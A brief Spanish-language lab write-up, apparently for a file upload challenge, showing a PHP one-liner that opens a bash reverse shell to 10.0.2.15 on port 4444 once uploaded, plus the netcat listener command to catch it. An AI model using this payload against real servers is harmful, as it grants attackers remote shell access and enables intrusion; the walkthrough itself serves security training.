# File Upload

## Descripción del reto

En esta vulnerabilidad tenemos que ejecutar un exploit mediante un fichero que se subira al servidor web.

## Explotación de la vulnerabilidad

1. Para explotar esta vulnerabilidad vamos a crear una revershell sencillo.

```bash
<?php exec("/bin/bash -c 'bash -i>& /dev/tcp/10.0.2.15/4444 0>&1'") ?>
```

![File upload](/img/FileUpload/Captura1.png)

2. Ahora nos pondremos en escucha por el puerto 4444 y esperaremos la respuesta.

```bash
nc -lvnp 4444
```